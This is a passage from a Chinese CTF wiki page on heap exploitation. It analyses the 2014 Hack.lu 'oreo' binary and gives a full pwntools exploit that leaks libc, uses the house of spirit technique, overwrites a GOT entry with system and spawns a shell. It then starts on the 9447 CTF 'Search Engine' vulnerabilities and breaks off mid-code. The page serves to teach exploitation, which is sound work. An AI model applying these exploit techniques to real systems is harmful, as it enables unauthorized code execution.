<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>No<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
</code></pre></div> <p>可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。</p> <h3 id=_16>基本功能<a class=headerlink href=#_16 title="Permanent link">&para;</a></h3> <p><strong>需要注意的是，该程序并没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。</strong></p> <p>正如程序中直接输出的信息，程序主要是一个原始的在线枪支系统。其中，根据添加枪支的过程，我们可以得到枪支的基本结构如下</p> <div class=highlight><pre><span></span><code><span class=mo>00000000</span><span class=w> </span><span class=n>rifle</span><span class=w>           </span><span class=n>struc</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=p>(</span><span class=k>sizeof</span><span class=o>=</span><span class=mh>0x38</span><span class=p>,</span><span class=w> </span><span class=n>mappedto_5</span><span class=p>)</span>
<span class=mo>00000000</span><span class=w> </span><span class=n>descript</span><span class=w>        </span><span class=n>db</span><span class=w> </span><span class=mi>25</span><span class=w> </span><span class=n>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
<span class=mo>0000001</span><span class=mi>9</span><span class=w> </span><span class=n>name</span><span class=w>            </span><span class=n>db</span><span class=w> </span><span class=mi>27</span><span class=w> </span><span class=n>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
<span class=mo>00000034</span><span class=w> </span><span class=n>next</span><span class=w>            </span><span class=n>dd</span><span class=w> </span><span class=o>?</span><span class=w>                    </span><span class=p>;</span><span class=w> </span><span class=n>offset</span>
<span class=mo>0000003</span><span class=mi>8</span><span class=w> </span><span class=n>rifle</span><span class=w>           </span><span class=n>ends</span>
</code></pre></div> <p>程序的基本功能如下</p> <ul> <li>添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27 大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。</li> <li>展示添加枪支，即从头到尾输出枪支的描述与名字。</li> <li>订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。</li> <li>留下订货消息</li> <li>展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。</li> </ul> <p>不难分析得到，程序的漏洞主要存在于添加枪支时的堆溢出漏洞。</p> <h3 id=_17>利用<a class=headerlink href=#_17 title="Permanent link">&para;</a></h3> <p>基本利用思路如下</p> <ol> <li>由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next 指针为 NULL。这里我采用 puts@got。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。</li> <li>由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 <code>house of sprit</code> 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为 0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。</li> <li>在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。</li> </ol> <p>具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;gnome-terminal&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;-c&#39;</span><span class=p>]</span>
<span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
    <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s2>&quot;./oreo&quot;</span>
<span class=n>oreo</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./oreo&quot;</span><span class=p>)</span>
<span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
<span class=k>else</span><span class=p>:</span>
    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./oreo&quot;</span><span class=p>)</span>
<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;PID: &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>pidof</span><span class=p>(</span><span class=n>p</span><span class=p>)[</span><span class=mi>0</span><span class=p>]))</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>descrip</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
    <span class=c1>#p.recvuntil(&#39;Rifle name: &#39;)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
    <span class=c1>#p.recvuntil(&#39;Rifle description: &#39;)</span>
    <span class=c1>#sleep(0.5)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>descrip</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>show_rifle</span><span class=p>():</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;===================================</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>order</span><span class=p>():</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>message</span><span class=p>(</span><span class=n>notice</span><span class=p>):</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
    <span class=c1>#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>notice</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>():</span>
    <span class=nb>print</span> <span class=s1>&#39;step 1. leak libc base&#39;</span>
    <span class=n>name</span> <span class=o>=</span> <span class=mi>27</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>oreo</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
    <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
    <span class=n>show_rifle</span><span class=p>()</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;===================================</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Description: &#39;</span><span class=p>)</span>
    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)[:</span><span class=mi>4</span><span class=p>])</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;puts addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>))</span>
    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
    <span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
    <span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span>

    <span class=nb>print</span> <span class=s1>&#39;step 2. free fake chunk at 0x0804A2A8&#39;</span>

    <span class=c1># now, oifle_cnt=1, we need set it = 0x40</span>
    <span class=n>oifle</span> <span class=o>=</span> <span class=mi>1</span>
    <span class=k>while</span> <span class=n>oifle</span> <span class=o>&lt;</span> <span class=mh>0x3f</span><span class=p>:</span>
        <span class=c1># set next link=NULL</span>
        <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>27</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
        <span class=n>oifle</span> <span class=o>+=</span> <span class=mi>1</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>27</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0804a2a8</span><span class=p>)</span>
    <span class=c1># set next link=0x0804A2A8, try to free a fake chunk</span>
    <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
    <span class=c1># before free, we need to bypass some check</span>
    <span class=c1># fake chunk&#39;s size is 0x40</span>
    <span class=c1># 0x20 *&#39;a&#39; for padding the last fake chunk</span>
    <span class=c1># 0x40 for fake chunk&#39;s next chunk&#39;s prev_size</span>
    <span class=c1># 0x100 for fake chunk&#39;s next chunk&#39;s size</span>
    <span class=c1># set fake iofle&#39; next to be NULL</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x20</span> <span class=o>*</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>52</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>128</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>)</span>
    <span class=n>message</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
    <span class=c1># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span>
    <span class=n>order</span><span class=p>()</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Okay order submitted!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

    <span class=nb>print</span> <span class=s1>&#39;step 3. get shell&#39;</span>
    <span class=c1># modify free@got to system addr</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>oreo</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;strlen&#39;</span><span class=p>])</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
    <span class=n>add</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mi>20</span><span class=p>)</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;system addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span>
    <span class=c1>#gdb.attach(p)</span>
    <span class=n>message</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>

    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&quot;__main__&quot;</span><span class=p>:</span>
    <span class=n>exp</span><span class=p>()</span>
</code></pre></div> <p>当然，该题目也可以使用 <code>fast bin attack</code> 中的其它技术来实现，可参考参考文献中的链接。</p> <h2 id=2015-9447-ctf-search-engine>2015 9447 CTF : Search Engine<a class=headerlink href=#2015-9447-ctf-search-engine title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine>题目链接</a></p> <h3 id=_18>基本信息<a class=headerlink href=#_18 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2015_9447ctf_search-engine<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>search
search:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>-bit<span class=w> </span>LSB<span class=w> </span>executable,<span class=w> </span>x86-64,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib64/ld-linux-x86-64.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.24,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>4f5b70085d957097e91f940f98c0d4cc6fb3343f,<span class=w> </span>stripped
➜<span class=w>  </span>2015_9447ctf_search-engine<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>search
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
<span class=w>    </span>FORTIFY:<span class=w>  </span>Enabled
</code></pre></div> <h3 id=_19>基本功能<a class=headerlink href=#_19 title="Permanent link">&para;</a></h3> <p>程序的基本功能是</p> <ul> <li>索引一个句子</li> <li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li> <li>读取的字符串长度必须和给定的大小相等</li> <li>每次索引的句子都是直接在直接建立在前面的句子上的。</li> <li>在一个句子中搜索单词</li> <li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li> <li>读取指定长度字符串</li> <li>如果有回车标记<ul> <li>在指定长度内没有遇到回车，则读完没有设置NULL标记</li> <li>在指定长度内遇到回车，就截断返回。</li> </ul> </li> <li>没有回车标记<ul> <li>读够指定长度，没有NULL标记结尾。</li> </ul> </li> </ul> <h3 id=_20>词语结构体<a class=headerlink href=#_20 title="Permanent link">&para;</a></h3> <p>通过分析索引句子的过程，我们可以得到词语的结构如下</p> <div class=highlight><pre><span></span><code>00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
00000000 content         dq ?
00000008 size            dd ?
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?                    ; offset
00000018 len             dd ?
0000001C padding2        dd ?
00000020 next            dq ?                    ; offset
00000028 word_struct     ends
</code></pre></div> <h3 id=_21>堆内存相关操作<a class=headerlink href=#_21 title="Permanent link">&para;</a></h3> <p>分配</p> <ul> <li>malloc 40 字节为一个word结构体</li> <li>为句子或者单词 malloc 指定大小。</li> </ul> <p>释放</p> <ul> <li>释放删除的句子</li> <li>释放删除句子所搜索的临时单词</li> <li>释放索引句子时未使用的单词结构</li> </ul> <h3 id=_22>漏洞<a class=headerlink href=#_22 title="Permanent link">&para;</a></h3> <p><strong>索引句子读取字符串时无NULL结尾</strong></p> <p>在索引句子时 flag_enter 永远为 0，所以读取句子时最后没有 NULL 结尾。</p> <div class=highlight><pre><span></span><code><span class=w>    </span><span class=n>_flag_enter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>flag_enter</span><span class=p>;</span>
<span class=w>    </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=n>v4</span><span class=p>];</span>
<span class=w>      </span><span class=n>v6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fread</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=n>v4</span><span class=p>],</span><span class=w> </span><span class=mi>1uLL</span><span class=p>,</span><span class=w> </span><span class=mi>1uLL</span><span class=p>,</span><span class=w> </span><span class=n>stdin</span><span class=p>);</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v6</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=k>break</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>*</span><span class=n>v5</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;\n&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>_flag_enter</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v4</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>          </span><span class=o>*</span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>          </span><span class=k>return</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>        </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v6</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>v6</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=k>break</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>else</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>v4</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>v6</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>v4</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=k>break</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
</code></pre></div> <p><strong>读取选择操作数</strong></p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=nf>read_num</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>endptr</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+8h] [rbp-50h]</span>
<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>nptr</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+10h] [rbp-48h]</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+48h] [rbp-10h]</span>

<span class=w>  </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>,</span><span class=w> </span><span class=mi>48</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
<span class=w>  </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strtol</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>endptr</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>endptr</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=o>&amp;</span><span class=n>nptr</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>__printf_chk</span><span class=p>(</span><span class=mf>1L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;%s is not a valid number</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>);</span>
<span class=w>    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=n>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <p>因为 read_str 不设置NULL ，因此，如果 nptr 读取的不合法的话，就有可能会 leak 出栈上的内容。</p> <p><strong>索引句子释放未置NULL</strong></p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=k>else</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>free</span><span class=p>(</span><span class=n>v6</span><span class=p>);</span>
<span class=w>  </span><span class=p>}</span>
</code></pre></div> <p><strong>搜索词语中删除词语时，对应句子指针只是释放，并没有设置为NULL</strong></p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>head</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=o>-&gt;</span><span class=n>next</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>*</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>v0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>memcmp</span><span class=p>((</span><span class=k>const</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>content</span><span class=p>,</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=n>v0</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>__printf_chk</span><span class=p>(</span><span class=mf>1L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Found %d: &quot;</span><span class=p>,</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>));</span>
<span class=w>        </span><span class=n>fwrite</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=p>,</span><span class=w> </span><span class=mi>1uLL</span><span class=p>,</span><span class=w> </span><span class=n>SLODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>),</span><span class=w> </span><span class=n>stdout</span><span class=p>);</span>
<span class=w>        </span><span class=n>putchar</span><span class=p>(</span><span class=sc>&#39;\n&#39;</span><span class=p>);</span>
<span class=w>        </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Delete this sentence (y/n)?&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>choice</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>choice</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;y&#39;</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>          </span><span class=n>memset</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>SLODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>));</span>
<span class=w>          </span><span class=n>free</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=p>);</span>
<span class=w>          </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Deleted!&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=n>free</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
